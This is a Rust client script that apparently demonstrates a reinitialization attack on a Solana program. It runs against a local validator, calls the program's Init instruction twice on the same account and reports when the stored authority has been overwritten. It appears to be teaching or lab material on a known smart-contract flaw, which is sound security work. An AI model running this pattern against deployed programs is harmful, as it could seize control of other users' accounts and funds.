
use borsh::{BorshDeserialize, BorshSerialize};
use arrayref::{array_ref};
use solana_client::rpc_client::RpcClient;
use solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
        program_error::ProgramError,
        program_pack::{IsInitialized, Pack, Sealed},
    };

use solana_sdk::{
        system_program,
        signature::{Keypair, read_keypair_file}, 
        signer::Signer, 
        commitment_config::CommitmentConfig,
        transaction::Transaction,
        native_token::LAMPORTS_PER_SOL,
    };
    
use owo_colors::OwoColorize;

#[derive(BorshSerialize, BorshDeserialize, Debug, PartialEq)]
enum MyInstruction {
  Init { },
  Create { }
}
#[derive(BorshSerialize, BorshDeserialize, PartialEq, Debug)]
pub struct User {
  authority: Pubkey,
}

impl Sealed for User {}

impl IsInitialized for User {
  fn is_initialized(&self) -> bool {
      true
  }
}

impl Pack for User {
  const LEN: usize = 32;

  fn pack_into_slice(&self, dst: &mut [u8]) {
      dst.copy_from_slice(self.authority.as_ref())
  }

  fn unpack_from_slice(src: &[u8]) -> Result<Self, ProgramError> {
      Ok(Self {
          authority: Pubkey::new_from_array(*array_ref![src, 0, 32]),
      })
  }
}

fn main() {

    let programa_keypair = read_keypair_file("./target/so/reinit_attack-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();

    let cliente1 = String::from("http://localhost:8899");

    //let payer = Keypair::new();
    let authority = Keypair::new();
    let account1 = Keypair::new();
    let account2 = Keypair::new();
    let account3 = Keypair::new();

    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());

    match env.request_airdrop(&authority.pubkey(), LAMPORTS_PER_SOL) {
        Ok(sig) => loop {
            if let Ok(confirmed) = env.confirm_transaction(&sig) {
                if confirmed {
                    println!("Transaction: {} Status: {}", sig, confirmed);
                    break;
                }
            }
        },
        Err(_) => println!("Error requesting airdrop"),
    };

    let data_len = 32;
    // let data_len = Rent::get().unwrap().minimum_balance(std::mem::size_of::<User>());
    let space:u64 = data_len as u64;
    
    let rent_exemption_amount = env.get_minimum_balance_for_rent_exemption(data_len as usize).unwrap(); 

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &account1.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&account1], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    let tx_create = solana_program::system_instruction::create_account( 
        &authority.pubkey(), 
        &account2.pubkey(), 
        rent_exemption_amount, 
        space, 
        &programa, 

    ); 

    let recent_blockhash = env.get_latest_blockhash().unwrap(); 
    let tx_create = Transaction::new_signed_with_payer( 
        &[tx_create], 
        Some(&authority.pubkey()), 
        &[&authority,&account2], 
        recent_blockhash, 
    ); 

    if let Err(err) = env.send_and_confirm_transaction(&tx_create) {
        println!("{:#?}", err);
        panic!();
    };

    println!("");
    println!("{}", "Working...".purple().bold());
    println!("");
    println!("Account 1: {}", account1.pubkey());
    println!("Account 2: {}", account2.pubkey());

    let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(account1.pubkey(), false),
            AccountMeta::new(account2.pubkey(), false),
            AccountMeta::new(system_program::ID, false),
        ],
        data: MyInstruction::Init {  }.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&account1.pubkey()).unwrap();
    
    println!("{}", "Reinitialization Attacks".green());

    let data1 = User::unpack_unchecked(&ac1_d[..32]).unwrap();
    println!("Account 1 authority 1st: {:?}", data1.authority);

    /*
    Second call using same account
     */

     let tx_init = Instruction {
        program_id: programa,
        accounts: vec![
            AccountMeta::new(account1.pubkey(), false),
            AccountMeta::new(account3.pubkey(), false),
        ],
        data: MyInstruction::Init {  }.try_to_vec().unwrap(),
    };
    let recent_blockhash = env.get_latest_blockhash().unwrap();

    let tx_init = Transaction::new_signed_with_payer(
        &[tx_init],
        Some(&authority.pubkey()),
        &[&authority],
        recent_blockhash,
    );
        
    if let Err(err) = env.send_and_confirm_transaction(&tx_init) {
        println!("{:#?}", err);
        panic!();
    };

    let ac1_d = env.get_account_data(&account1.pubkey()).unwrap();

    let data2 = User::unpack_unchecked(&ac1_d[..32]).unwrap();

    if data1 != data2 { 
        println!("{}", "The Account has being reinitialized and it has overridden existing account data".red());
    }

    println!("Account 1 authority 2nd: {:?}", data2.authority);
}